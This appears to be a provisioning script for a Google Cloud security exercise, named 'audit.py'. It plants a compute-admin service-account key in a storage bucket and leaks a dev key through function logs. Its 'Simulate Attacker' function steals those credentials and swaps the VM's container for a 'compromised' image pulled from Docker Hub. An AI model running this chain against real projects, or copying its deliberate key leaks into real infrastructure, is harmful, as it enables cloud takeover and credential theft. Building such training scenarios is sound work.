import os
import json
import csv
import time
import subprocess
import zipfile
import shutil
import requests
import psycopg2
import google.auth
import google.auth.transport.requests
from google.cloud import storage, logging as glogging
from google.oauth2 import service_account, id_token
from googleapiclient.discovery import build
import google.auth.transport.requests
from google.auth.transport.requests import Request
import httplib2
import jinja2
import base64

# === Cloud Function Upload Helpers ===
def upload_cloud_function(function_path, location_id, template_args={}):
    temp_func_path = function_path + '-temp'
    zip_path = os.path.dirname(temp_func_path) + '/' + 'function.zip'
    try:
        _create_temp_cf_files(function_path, temp_func_path, template_args=template_args)
        credentials, project_id = google.auth.default()
        with zipfile.ZipFile(zip_path, 'w') as z:
            for dir_path, _, f_names in os.walk(temp_func_path):
                for f in f_names:
                    file_path = os.path.join(dir_path, f)
                    arc_path = file_path.replace(temp_func_path + '/', '')
                    z.write(file_path, arcname=arc_path)
        cf_api = build('cloudfunctions', 'v1', credentials=credentials)
        parent = f'projects/{project_id}/locations/{location_id}'
        upload_url = cf_api.projects().locations().functions().generateUploadUrl(parent=parent).execute()['uploadUrl']
        h = httplib2.Http()
        headers = {'Content-Type': 'application/zip', 'x-goog-content-length-range': '0,104857600'}
        with open(zip_path, 'rb') as f:
            h.request(upload_url, method='PUT', headers=headers, body=f)
        return upload_url
    finally:
        if os.path.exists(zip_path):
            os.remove(zip_path)
        if os.path.exists(temp_func_path):
            shutil.rmtree(temp_func_path)

def _create_temp_cf_files(func_path, temp_func_path, template_args={}):
    for dir_path, _, f_names in os.walk(func_path):
        for f in f_names:
            file_path = os.path.join(dir_path, f)
            temp_path = file_path.replace(func_path, temp_func_path)
            with open(file_path) as file:
                rendered = jinja2.Template(file.read()).render(**template_args)
            os.makedirs(os.path.dirname(temp_path), exist_ok=True)
            with open(temp_path, 'w+') as f_out:
                f_out.write(rendered)

# === IAM Key Generator ===
def generate_service_account_key(service_account_id):
    credentials, project_id = google.auth.default()
    service_account_email = f'{service_account_id}@{project_id}.iam.gserviceaccount.com'
    iam_api = build('iam', 'v1', credentials=credentials)
    key = iam_api.projects().serviceAccounts().keys().create(
        name=f'projects/{project_id}/serviceAccounts/{service_account_email}', body={}
    ).execute()
    return base64.b64decode(key['privateKeyData']).decode('utf-8')

# === ENV Vars ===
PROJECT_ID = os.environ["GOOGLE_CLOUD_PROJECT"]
REGION     = os.environ["REGION"]
ZONE       = os.environ["ZONE"]
NONCE      = os.environ["NONCE"]
DB_PASSWORD = os.environ["DB_PASSWORD"]

DB_NAME       = "audit"
DB_USER       = "api-engine"
INSTANCE_NAME = f"audit-db-{NONCE}"
BUCKET_NAME   = f"vm-image-bucket-{NONCE}"
VM_NAME       = f"api-engine"

# === Start Cloud SQL Proxy ===
print("🚀 Starting Cloud SQL Proxy...")
proxy_path = os.path.join(os.path.dirname(__file__), "cloud_sql_proxy")
proxy = subprocess.Popen([
    proxy_path,
    f"-instances={PROJECT_ID}:{REGION}:{INSTANCE_NAME}=tcp:5432"
])
time.sleep(5)

# === Seed the Database ===
print("📥 Seeding database...")
conn = psycopg2.connect(
    host="127.0.0.1",
    port=5432,
    user=DB_USER,
    password=DB_PASSWORD,
    dbname=DB_NAME
)
cursor = conn.cursor()
cursor.execute("""
CREATE TABLE IF NOT EXISTS users (
  user_id  SERIAL PRIMARY KEY,
  name     TEXT NOT NULL,
  phone    TEXT NOT NULL,
  address  TEXT NOT NULL
);""")
cursor.execute("""
CREATE TABLE IF NOT EXISTS devs (
  dev_id   SERIAL PRIMARY KEY,
  name     TEXT NOT NULL,
  phone    TEXT NOT NULL,
  address  TEXT NOT NULL
);""")
cursor.execute("""
CREATE TABLE IF NOT EXISTS follows (
  follow_id SERIAL PRIMARY KEY,
  follower INT NOT NULL REFERENCES users(user_id),
  followee INT NOT NULL REFERENCES users(user_id)
);""")
devs_csv = os.path.join(os.path.dirname(__file__), "resources", "devs.csv")
with open(devs_csv, newline='') as f:
    for row in csv.DictReader(f):
        cursor.execute(
            "INSERT INTO devs (name, phone, address) VALUES (%s, %s, %s);",
            (row["name"], row["phone"], row["address"])
        )
conn.commit()
cursor.close()
conn.close()
proxy.terminate()
print("✅ Database seeded.")

# === Upload API to GCS ===
def upload_directory_recursive(top_dir_path, bucket_name):
    client = storage.Client()
    bucket = client.bucket(bucket_name)
    for dir_path, _, file_names in os.walk(top_dir_path):
        for file_name in file_names:
            abs_path = os.path.join(dir_path, file_name)
            rel_path = os.path.relpath(abs_path, top_dir_path)
            blob = storage.Blob(rel_path, bucket)
            with open(abs_path, 'rb') as f_obj:
                blob.upload_from_file(f_obj)

print("☁️ Uploading API code to GCS...")
api_dir = os.path.join(os.path.dirname(__file__), "resources", "api-engine")
upload_directory_recursive(api_dir, BUCKET_NAME)

# === Upload Compute Admin Key ===
print("🔑 Uploading compute-admin.json...")
compute_admin_key = generate_service_account_key("compute-admin")
storage.Client().bucket(BUCKET_NAME).blob("compute-admin.json").upload_from_string(compute_admin_key)

# === Simulate Developer Log (Function Call) ===
print("🧑‍💻 Triggering Cloud Function with dev-account key...")
dev_key = generate_service_account_key("dev-account")
url = f"https://{REGION}-{PROJECT_ID}.cloudfunctions.net/rm-user-{NONCE}"
req = google.auth.transport.requests.Request()
credentials, _ = google.auth.default()
auth_header = {"Authorization": f"Bearer {credentials.token}"}
resp = requests.post(url, headers=auth_header, data={
    "name": "Robert Caldwell",
    "user_id": "1",
    "authentication": dev_key
})
print(f"Cloud Function returned: {resp.status_code}")

# === Simulate Attacker ===
def run_attacker_behavior(nonce, log_viewer_key):
    creds = service_account.Credentials.from_service_account_info(json.loads(log_viewer_key))
    logging_client = glogging.Client(credentials=creds)

    while True:
        try:
            logger = logging_client.logger('rmUser')
            logs = logger.list_entries()
            leaked_dev_key = list(logs)[-1].payload['auth']
            break
        except:
            time.sleep(5)

    dev_creds = service_account.Credentials.from_service_account_info(json.loads(leaked_dev_key))
    bucket = storage.Client(credentials=dev_creds).bucket(f'vm-image-bucket-{nonce}')
    blobs = list(bucket.list_blobs())

    temp_dir = "/tmp/attacker"
    os.makedirs(temp_dir, exist_ok=True)
    for blob in blobs:
        blob.download_to_filename(os.path.join(temp_dir, blob.name))

    with open(os.path.join(temp_dir, "compute-admin.json")) as f:
        attacker_creds = service_account.Credentials.from_service_account_info(json.load(f))

    compute = build("compute", "v1", credentials=attacker_creds)
    instance = compute.instances().get(project=PROJECT_ID, zone=ZONE, instance=VM_NAME).execute()
    fingerprint = instance["metadata"]["fingerprint"]

    compute.instances().setMetadata(
        project=PROJECT_ID,
        zone=ZONE,
        instance=VM_NAME,
        body={
            "fingerprint": fingerprint,
            "items": [{
                "key": "gce-container-declaration",
                "value": '''spec:
  containers:
    - name: api
      image: docker.io/aujxn/defender-audit-compromised:latest
      stdin: false
      tty: false
  restartPolicy: Always'''
            }]
        }
    ).execute()

    compute.instances().stop(project=PROJECT_ID, zone=ZONE, instance=VM_NAME).execute()
    while compute.instances().get(project=PROJECT_ID, zone=ZONE, instance=VM_NAME).execute()["status"] != "TERMINATED":
        time.sleep(5)
    compute.instances().start(project=PROJECT_ID, zone=ZONE, instance=VM_NAME).execute()
    while compute.instances().get(project=PROJECT_ID, zone=ZONE, instance=VM_NAME).execute()["status"] != "RUNNING":
        time.sleep(5)
    shutil.rmtree(temp_dir)

print("💀 Simulating attacker behavior...")
log_viewer_key = generate_service_account_key("log-viewer")
run_attacker_behavior(NONCE, log_viewer_key)

print("✅ audit.py provisioning complete.")
